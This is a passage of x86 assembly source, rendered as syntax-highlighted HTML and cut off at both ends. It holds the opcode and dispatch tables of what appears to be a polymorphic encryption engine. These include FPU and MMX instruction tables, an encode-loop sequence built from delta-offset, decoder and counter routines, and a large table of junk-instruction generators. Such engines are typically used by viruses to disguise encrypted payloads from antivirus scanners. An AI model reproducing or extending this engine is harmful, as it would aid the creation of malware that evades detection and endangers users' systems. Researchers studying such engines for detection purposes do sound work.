        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">       </span><span class="sc1">;FLD1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">       </span><span class="sc1">;FLDL2T</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">       </span><span class="sc1">;FLDL2E</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">       </span><span class="sc1">;FLDPI</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc0">       </span><span class="sc1">;FLDLG2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc0">       </span><span class="sc1">;FLDLN2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc0">       </span><span class="sc1">;FLDZ</span><span class="sc0">
</span><span class="sc5">end_copro_movin</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; tables of instructions to load any value from copro-reg</span><span class="sc0">

</span><span class="sc5">tbl_copro_movout</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">;FIST  word ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">;FIST dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">;FST  dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">;FST  qword ptr</span><span class="sc0">
</span><span class="sc5">end_copro_movout</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of basic instructions for copro-math</span><span class="sc0">

</span><span class="sc5">tbl_copro_math</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FIADD  word ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FIADD dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;FISUB  word ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;FISUB dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FADD  dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;FADD  qword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;FSUB  dword ptr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;FSUB  qword ptr</span><span class="sc0">
</span><span class="sc5">end_copro_math</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of the others instruction of copro</span><span class="sc0">
        </span><span class="sc1">; FP(A)TAN, FSCALE rewrite ST and ST(1), they're not here</span><span class="sc0">

</span><span class="sc5">tbl_copro_others</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">       </span><span class="sc1">;FSIN</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">;FCOS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0">       </span><span class="sc1">;FSINCOS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc0">       </span><span class="sc1">;FABS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">       </span><span class="sc1">;FCHS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc0">       </span><span class="sc1">;FSQRT</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">       </span><span class="sc1">;FRNDINT</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">       </span><span class="sc1">;FNOP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc0">       </span><span class="sc1">;FTST</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc0">       </span><span class="sc1">;FXAM</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">;FFREE ST(x)</span><span class="sc0">
</span><span class="sc5">end_copro_others</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of the others MMX instructions</span><span class="sc0">

</span><span class="sc5">tbl_mmx_others</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6Eh</span><span class="sc4">,</span><span class="sc2">6Fh</span><span class="sc0">         </span><span class="sc1">;MOVD, MOVQ</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6Bh</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">     </span><span class="sc1">;PACKSSDW, PACKSSWB, PACKUSWB</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc0">     </span><span class="sc1">;PUNPCKHBW, PUNPCKHDQ, PUNPCKHWD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">     </span><span class="sc1">;PUNPCKLBW, PUNPCKLDQ, PUNPCKLWD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">     </span><span class="sc1">;PCMPEQB, PCMPEQD, PCMPEQW</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">     </span><span class="sc1">;PCMPGTB, PCMPGTD, PCMPGTW</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc0">      </span><span class="sc1">;PSRLW, PSRLD, PSRRLQ</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">       </span><span class="sc1">;PSRAW, PSRAD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc0">      </span><span class="sc1">;PSLLW, PSLLD, PSSLQ</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">0Dfh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc0"> </span><span class="sc1">;PAND, PANDN, POR, PXOR</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc0">      </span><span class="sc1">;PMULLW, PMULHW, PMADDWD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">      </span><span class="sc1">;PADDB, PADDW, PADDD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">0DDh</span><span class="sc0"> </span><span class="sc1">;PADDSB, PADDSW, PADDUSB, PADDUSW</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc0">      </span><span class="sc1">;PSUBB, PSUBW, PSUBD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc0"> </span><span class="sc1">;PSUBSB, PSUBSW, PSUBUSB, PSUBUSW</span><span class="sc0">
</span><span class="sc5">end_mmx_others</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of encode-loop</span><span class="sc0">
        </span><span class="sc1">; the first  value means - count</span><span class="sc0">
        </span><span class="sc1">; the second value means - random select ?</span><span class="sc0">
        </span><span class="sc1">; the third  value means - already generated ?</span><span class="sc0">

</span><span class="sc5">tbl_encode_loop</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_cpuid_mmx</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_copro_mmx_clear</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_delta</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_encode_one</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_index</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_counter</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_decoder</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_next_index</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_next_code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_next_counter</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_exloop</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_return</span><span class="sc0">
</span><span class="sc5">end_encode_loop</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of the instructions which they don't modify flags</span><span class="sc0">
        </span><span class="sc1">; 1st value = move to original instructions</span><span class="sc0">
        </span><span class="sc1">; 2nd value = how many garbages don't modify flags</span><span class="sc0">

</span><span class="sc5">tbl_no_flags</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__no_flags_1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__no_flags_2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">end_no_flags</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; hyper table of garbages (support MMX and Copro), wow !</span><span class="sc0">
        </span><span class="sc1">; where __no_flags_X means the following garbages don't</span><span class="sc0">
        </span><span class="sc1">; modify any flags, do NOT modify this table 'cause of flags</span><span class="sc0">

</span><span class="sc5">tbl_garbage</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_push_g_pop</span><span class="sc0"> </span><span class="sc1">;push reg/garbage/pop reg</span><span class="sc0">
   </span><span class="sc5">__no_flags_1</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg32imm</span><span class="sc0">    </span><span class="sc1">;mov reg32,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg16imm</span><span class="sc0">    </span><span class="sc1">;mov reg16,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg8imm</span><span class="sc0"> </span><span class="sc1">;mov reg8,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg32</span><span class="sc0">    </span><span class="sc1">;mov reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg16</span><span class="sc0">    </span><span class="sc1">;mov reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0"> </span><span class="sc1">;mov reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathreg32imm</span><span class="sc0">   </span><span class="sc1">;math reg32,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathreg16imm</span><span class="sc0">   </span><span class="sc1">;math reg16,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathreg8imm</span><span class="sc0">    </span><span class="sc1">;math reg8,imm</span><span class="sc0">
   </span><span class="sc5">__no_flags_2</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_call_cont</span><span class="sc0">  </span><span class="sc1">;call/garbage/pop</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_u</span><span class="sc0">     </span><span class="sc1">;jump/rnd data</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_c</span><span class="sc0">     </span><span class="sc1">;jump conditional/garbage</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx_32</span><span class="sc0"> </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx_16</span><span class="sc0"> </span><span class="sc1">;movzx/movsx reg16,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx_8</span><span class="sc0">  </span><span class="sc1">;movzx/movsx reg32,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rotate_shift32</span><span class="sc0"> </span><span class="sc1">;(rcr,sal...) reg32,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rotate_shift16</span><span class="sc0"> </span><span class="sc1">;(ror,shl...) reg16,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rotate_shift8</span><span class="sc0">  </span><span class="sc1">;(rol,shr...) reg8,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rs_reg32reg8</span><span class="sc0">   </span><span class="sc1">;(rcr,sal...) reg32,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rs_reg16reg8</span><span class="sc0">   </span><span class="sc1">;(ror,shl...) reg16,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rs_reg8reg8</span><span class="sc0">    </span><span class="sc1">;(rol,shr...) reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bit_test32</span><span class="sc0"> </span><span class="sc1">;(bsf,bsr...) reg32,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bit_test16</span><span class="sc0"> </span><span class="sc1">;(btc,bts...) reg16,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bt_regreg32</span><span class="sc0">    </span><span class="sc1">;(bsf,bsr...) reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bt_regreg16</span><span class="sc0">    </span><span class="sc1">;(btc,bts...) reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregreg32</span><span class="sc0">   </span><span class="sc1">;(add,sub...) reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregreg16</span><span class="sc0">   </span><span class="sc1">;(xor,and...) reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregreg8</span><span class="sc0">    </span><span class="sc1">;(sbb,adc...) reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_set_byte</span><span class="sc0">   </span><span class="sc1">;(seta,setp.) reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_loop</span><span class="sc0">       </span><span class="sc1">;garbage/(loope/loopnz...)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_loop_jump</span><span class="sc0">  </span><span class="sc1">;garbage/(dec reg8/16/32, jnz)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_call_reg32</span><span class="sc0"> </span><span class="sc1">;gen reg32/call reg32/rndblock/pop reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_reg32</span><span class="sc0"> </span><span class="sc1">;gen reg32/jump reg32/rndblock</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_repeat</span><span class="sc0">     </span><span class="sc1">;gen regz/rep(lods,cmps...)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_pushpop_value</span><span class="sc0">  </span><span class="sc1">;push rnd(32/16)/garbage/pop reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_crypt_value</span><span class="sc0">    </span><span class="sc1">;crypt rnd32 value to reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_compare</span><span class="sc0">    </span><span class="sc1">;dec reg32/cmp r32,r32/jnz</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_iluzo_return</span><span class="sc0">   </span><span class="sc1">;gen reg32/jmp reg32/-jmp offs-</span><span class="sc0">
    </span><span class="sc5">__garbage_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_copro_movin</span><span class="sc0">    </span><span class="sc1">;(fld,fild,fldz...) w/d/q ptr [---]</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_copro_movout</span><span class="sc0">   </span><span class="sc1">;(fst,fist...) w/d/q ptr [---]</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_copro_math</span><span class="sc0"> </span><span class="sc1">;(fadd,fsub...) (w/d)/(st(x),st)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_copro_others</span><span class="sc0">   </span><span class="sc1">;(fsin,fptan,fabs,fxch,ffree,..)</span><span class="sc0">
    </span><span class="sc5">__garbage_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mmx</span><span class="sc0">        </span><span class="sc1">;fully 46 instructions !!</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mmx</span><span class="sc0">        </span><span class="sc1">;2nd use ('cause it's a</span><span class="sc0">
